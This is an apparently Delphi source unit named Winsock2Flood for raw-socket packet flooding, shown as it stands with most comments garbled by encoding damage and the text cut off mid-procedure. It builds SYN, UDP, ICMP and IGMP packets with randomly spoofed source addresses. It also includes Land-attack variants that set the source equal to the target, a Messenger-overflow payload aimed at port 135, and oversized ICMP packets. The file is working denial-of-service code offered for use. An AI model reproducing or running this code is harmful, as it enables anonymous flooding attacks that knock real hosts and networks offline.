
//SYN �ܾ����񹥻� DDOS α��IPԴ

unit Winsock2Flood;

interface
uses
  Windows, Winsock, SysUtils, Math; //RandomRange����

const
  UDP_MAX_MESSAGE = 4068;
  UDP_MAX_PACKET = 4096;
  ICMP_MAX_PACKET = 65535;
  IGMP_MAX_PACKET = ICMP_MAX_PACKET;
  ICMP_PACKET = 65000;
  IGMP_PACKET = ICMP_PACKET;
  IP_HDRINCL = 2;
  HEADER_SEQ = $28376839;

type
  TTCPPacketBuffer = array[0..59] of Byte;
  TUDPPacketBuffer = array[0..UDP_MAX_PACKET - 1] of Byte;
  TICMPPacketBuffer = array[0..ICMP_MAX_PACKET - 1] of Byte;
  TIGMPPacketBuffer = array[0..IGMP_MAX_PACKET - 1] of Byte;


//ͨ��IPͷ�Ľṹ
type
  T_IP_Header = record
    ip_verlen: Byte; //4λͷ�곤,4λIP�汾��
    ip_tos: Byte; //��������
    ip_totallength: Word; //�ܳ���
    ip_id: Word; //��ʶ
    ip_offset: Word; //��־��Ƭƫ��
    ip_ttl: Byte; //����ʱ��
    ip_protocol: Byte; //Э������
    ip_checksum: Word; //ͷ��У���
    ip_srcaddr: Longword; //ԴIP��ַ
    ip_destaddr: Longword; //Ŀ��IP��ַ
  end;

//TCPαͷ
type
  T_PSDTCP_Header = record
    SourceAddr: DWORD; //Դ��ַ
    DestinationAddr: DWORD; //Ŀ���ַ
    Mbz: Byte; //
    Protocol: Byte; //Э������
    TcpLength: Word; //TCP����
  end;

//TCPͷ
type
  T_TCP_Header = record
    src_portno: Word; //Դ�˿�
    dst_portno: Word; //Ŀ�Ķ˿�
    tcp_seq: DWORD; //���к�
    tcp_ack: DWORD; //ȷ�Ϻ�
    tcp_lenres: Byte; //4λ�ײ�����/6λ������
    tcp_flag: Byte; //��־λ 2��SYN��1��FIN��16��ACK̽��
    tcp_win: Word; //���ڴ�С
    tcp_checksum: Word; //У���
    tcp_offset: Word; //��������ƫ����
  end;

//UDPͷ
type
  T_UDP_Header = record
    src_portno: Word;
    dst_portno: Word;
    udp_length: Word;
    udp_checksum: Word;
  end;

//ICMPͷ
type
  T_ICMP_Header = record
    icmp_type: Byte;
    icmp_code: Byte;
    icmp_checksum: Word;
    icmp_id: Word;
    icmp_seq: Word;
    timestamp: ULONG;
  end;

//IGMPͷ
type
  T_IGMP_Header = record
    igmp_type: Byte; //Э�����Ϣ����
    igmp_code: Byte; //routing code
    igmp_checksum: Word; //У���
    group: ULONG;
  end;

function CheckSum(var Buffer; Size: Integer): Word;

//(1)�����Ϣ�ؽ�TCPͷ
procedure BuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Landģʽ�ؽ�TCPͷ
procedure LandBuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)�����Ϣ�ؽ�UDPͷ
procedure BuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Landģʽ�ؽ�UDPͷ
procedure LandBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(3)Messenger�������ģʽ�ؽ�UDPͷ
procedure MsgOverflowBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)�����Ϣ�ؽ�ICMPͷ
procedure BuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Landģʽ�ؽ�ICMPͷ
procedure LandBuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)�����Ϣ�ؽ�IGMPͷ
procedure BuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Landģʽ�ؽ�IGMPͷ
procedure LandBuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//NTϵͳ��Ϊ�ؼ���һ�����ܺ�����9xϵ�й��ܲ�ͬ
function NTXPsetsockopt(s: TSocket; level, optname: Integer; optval: PChar;
  optlen: Integer): Integer; stdcall; external 'WS2_32.DLL' Name 'setsockopt';

//WinSock2��WSASocket����ʹ�ó���
const
  WSA_FLAG_OVERLAPPED = $01;
  WSA_FLAG_MULTIPOINT_C_ROOT = $02;
  WSA_FLAG_MULTIPOINT_C_LEAF = $04;
  WSA_FLAG_MULTIPOINT_D_ROOT = $08;
  WSA_FLAG_MULTIPOINT_D_LEAF = $10;
//
  MAX_PROTOCOL_CHAIN = 7;
  WSAPROTOCOL_LEN = 255;

type
  _WSAPROTOCOLCHAIN = record
    ChainLen: Integer; // the length of the chain,
                                // length = 0 means layered protocol,
                                // length = 1 means base protocol,
                                // length > 1 means protocol chain
    ChainEntries: array[0..MAX_PROTOCOL_CHAIN - 1] of DWORD; // a list of dwCatalogEntryIds
  end;
  WSAPROTOCOLCHAIN = _WSAPROTOCOLCHAIN;

  LPWSAPROTOCOL_INFOW = ^WSAPROTOCOL_INFOW;
  _WSAPROTOCOL_INFOW = record
    dwServiceFlags1: DWORD;
    dwServiceFlags2: DWORD;
    dwServiceFlags3: DWORD;
    dwServiceFlags4: DWORD;
    dwProviderFlags: DWORD;
    ProviderId: TGUID;
    dwCatalogEntryId: DWORD;
    ProtocolChain: WSAPROTOCOLCHAIN;
    iVersion: Integer;
    iAddressFamily: Integer;
    iMaxSockAddr: Integer;
    iMinSockAddr: Integer;
    iSocketType: Integer;
    iProtocol: Integer;
    iProtocolMaxOffset: Integer;
    iNetworkByteOrder: Integer;
    iSecurityScheme: Integer;
    dwMessageSize: DWORD;
    dwProviderReserved: DWORD;
    szProtocol: array[0..WSAPROTOCOL_LEN] of WideChar;
  end;
  WSAPROTOCOL_INFOW = _WSAPROTOCOL_INFOW;

function WSASocket(af, type_, Protocol: Integer; lpProtocolInfo: LPWSAPROTOCOL_INFOW;
  g: Cardinal; dwFlags: DWORD): TSocket; stdcall; external 'WS2_32.DLL' Name 'WSASocketW';

//ȫ�ֱ���
var
//TCP���ֹ�������
  TCPBuf: TTCPPacketBuffer;
  TCPRemote: TSockAddr;
  TCPiTotalSize: Word;
//UDP���ֹ�������
  UDPBuf: TUDPPacketBuffer;
  UDPRemote: TSockAddr;
  UDPiTotalSize: Word;
  UDPFloodStr: string;
//ICMP���ֹ�������
  ICMPBuf: TICMPPacketBuffer;
  ICMPRemote: TSockAddr;
  ICMPiTotalSize: Word;
//IGMP���ֹ�������
  IGMPBuf: TIGMPPacketBuffer;
  IGMPRemote: TSockAddr;
  IGMPiTotalSize: Word;

implementation

function CheckSum(var Buffer; Size: Integer): Word;
type
  TWordArray = array[0..1] of Word;
var
  ChkSum: Longword;
  I: Integer;
begin
  ChkSum := 0; I := 0;
  while Size > 1 do
  begin
    Inc(ChkSum, TWordArray(Buffer)[I]);
    Inc(I);
    Dec(Size, SizeOf(Word));
  end;
  if Size = 1 then ChkSum := ChkSum + Byte(TWordArray(Buffer)[I]);
  ChkSum := (ChkSum shr 16) + (ChkSum and $FFFF);
  Inc(ChkSum, (ChkSum shr 16));
  Result := Word(not ChkSum);
end;

//(1)�ؽ�TCP��IPͷ����Ϣ
procedure BuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  TCPHeader: T_TCP_Header;
  PsdHeader: T_PSDTCP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_TCP_Header);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_TCP; //Э������
  IPHeader.ip_checksum := 0; //У���
//�������Դ��ַ
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��TCPͷ
//�������Դ�˿�
  TCPHeader.src_portno := htons(Random(65536) + 1); //Դ�˿�
  TCPHeader.dst_portno := Remote.sin_port; //Ŀ��˿�
  TCPHeader.tcp_seq := htonl(HEADER_SEQ); //���к�
  TCPHeader.tcp_ack := 0; //ȷ�Ϻ�
  TCPHeader.tcp_lenres := (SizeOf(T_TCP_Header) shr 2 shl 4) or 0; //�ײ�����
  TCPHeader.tcp_flag := 2; //2��SYN��1��FIN��16��ACK̽��
  TCPHeader.tcp_win := htons(16384); //���ڴ�С
  TCPHeader.tcp_checksum := 0; //У���
  TCPHeader.tcp_offset := 0; //����ƫ����

//�������֣���ʼ��TCPαͷ
  PsdHeader.SourceAddr := IPHeader.ip_srcaddr;
  PsdHeader.DestinationAddr := IPHeader.ip_destaddr;
  PsdHeader.Mbz := 0;
  PsdHeader.Protocol := IPPROTO_TCP;
  PsdHeader.TcpLength := htons(SizeOf(T_TCP_Header));

//���Ĳ��֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
//�������ֶθ��Ƶ�ͬһ��������Buf�в�����TCPͷУ���
  CopyMemory(@Buf[0], @PsdHeader, SizeOf(T_PSDTCP_Header));
  CopyMemory(@Buf[SizeOf(T_PSDTCP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  TCPHeader.tcp_checksum := CheckSum(Buf, SizeOf(T_PSDTCP_Header) + SizeOf(T_TCP_Header));

//����IPͷУ��͵�ʱ����Ҫ����TCPα�ײ�
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_TCP_Header)], 4, #0);
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_TCP_Header));

//�ٽ������У��͵�IPͷ��TCPͷ���Ƶ�ͬһ����������
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(2)Landģʽ(ֻ���ڳ�ʼ��ʱ���ؽ�һ�μ���)�ؽ�TCPͷ����Ϣ
procedure LandBuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  IPHeader: T_IP_Header;
  TCPHeader: T_TCP_Header;
  PsdHeader: T_PSDTCP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_TCP_Header);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_TCP; //Э������
  IPHeader.ip_checksum := 0; //У���

  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��TCPͷ
  TCPHeader.src_portno := htons(Random(65536) + 1); //Դ�˿�
  TCPHeader.dst_portno := Remote.sin_port; //Ŀ��˿�
  TCPHeader.tcp_seq := htonl(HEADER_SEQ); //���к�
  TCPHeader.tcp_ack := 0; //ȷ�Ϻ�
  TCPHeader.tcp_lenres := (SizeOf(T_TCP_Header) shr 2 shl 4) or 0; //�ײ�����
  TCPHeader.tcp_flag := 2; //2��SYN��1��FIN��16��ACK̽��
  TCPHeader.tcp_win := htons(16384); //���ڴ�С
  TCPHeader.tcp_checksum := 0; //У���
  TCPHeader.tcp_offset := 0; //����ƫ����

//�������֣���ʼ��TCPαͷ
  PsdHeader.SourceAddr := IPHeader.ip_srcaddr;
  PsdHeader.DestinationAddr := IPHeader.ip_destaddr;
  PsdHeader.Mbz := 0;
  PsdHeader.Protocol := IPPROTO_TCP;
  PsdHeader.TcpLength := htons(SizeOf(T_TCP_Header));

//���Ĳ��֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
//�������ֶθ��Ƶ�ͬһ��������Buf�в�����TCPͷУ���
  CopyMemory(@Buf[0], @PsdHeader, SizeOf(T_PSDTCP_Header));
  CopyMemory(@Buf[SizeOf(T_PSDTCP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  TCPHeader.tcp_checksum := CheckSum(Buf, SizeOf(T_PSDTCP_Header) + SizeOf(T_TCP_Header));

//����IPͷУ��͵�ʱ����Ҫ����TCPα�ײ�
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_TCP_Header)], 4, #0);
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_TCP_Header));

//�ٽ������У��͵�IPͷ��TCPͷ���Ƶ�ͬһ����������
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(1)�ؽ�UDP��IPͷ����Ϣ
procedure BuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
//�������Ŀ��˿�
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP��������
  IPHeader.ip_totallength := htons(iTotalSize); // ���ݰ�����
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // ��ƫ����
  IPHeader.ip_ttl := RandomRange(128, 250); // �����
  IPHeader.ip_protocol := IPPROTO_UDP; // Э������
  IPHeader.ip_checksum := 0; // У���
//�������Դ��ַ
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP)); //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��UDPͷ
//�������Դ�˿ں�Ŀ��˿�
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //Ŀ��˿�
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP����С
  UDPHeader.udp_checksum := 0; //У���

//�������֣�����У���
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//��仺����
  FillChar(Buf, SizeOf(Buf), #0);
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(2)Landģʽ�ؽ�UDPͷ
procedure LandBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP��������
  IPHeader.ip_totallength := htons(iTotalSize); // ���ݰ�����
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // ��ƫ����
  IPHeader.ip_ttl := RandomRange(128, 250); // �����
  IPHeader.ip_protocol := IPPROTO_UDP; // Э������
  IPHeader.ip_checksum := 0; // У���
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��UDPͷ
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //Ŀ��˿�
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP����С
  UDPHeader.udp_checksum := 0; //У���

//�������֣�����У���
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(UDPHeader));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//��仺����
  FillChar(Buf, SizeOf(Buf), #0);
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(3)Messenger�������ģʽ�ؽ�UDPͷ
procedure MsgOverflowBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
//�ƶ�Ϊ135�˿�
  Remote.sin_port := htons(135);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP��������
  IPHeader.ip_totallength := htons(iTotalSize); // ���ݰ�����
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // ��ƫ����
  IPHeader.ip_ttl := RandomRange(128, 250); // �����
  IPHeader.ip_protocol := IPPROTO_UDP; // Э������
  IPHeader.ip_checksum := 0; // У���
//�������Դ��ַ
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP)); //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��UDPͷ
//�������Դ�˿ں�Ŀ��˿�
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //Ŀ��˿�
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP����С
  UDPHeader.udp_checksum := 0; //У���

//�������֣�����У���
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//��Ϣ����$14�ֽ�ΪCR+LF�ַ�,�ڴ˴���������ݰ�
  FillChar(Buf, SizeOf(Buf), $14);
  Buf[3992 - ChSum + SizeOf(T_IP_Header) - SizeOf(T_UDP_Header) - 1] := 0;
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(1)�����Ϣ�ؼ�ICMPͷ
procedure BuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  ICMPHeader: T_ICMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header) + ICMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_ICMP; //Э������
  IPHeader.ip_checksum := 0; //У���

//�������Դ��ַ
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��ICMPͷ
  ICMPHeader.icmp_type := 0; //0,14Ч����
  ICMPHeader.icmp_code := 255;
  ICMPHeader.icmp_checksum := 0;
  ICMPHeader.icmp_id := 2;
  ICMPHeader.icmp_seq := 999;
  ICMPHeader.timestamp := GetTickCount;

//�������֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
//����ICMPͷУ���
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header)], ICMP_PACKET, 'E');
  ICMPHeader.icmp_checksum := CheckSum(Buf, iTotalSize);

//����IPͷУ���
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(2)Landģʽ�ؽ�ICMPͷ
procedure LandBuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  IPHeader: T_IP_Header;
  ICMPHeader: T_ICMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header) + ICMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
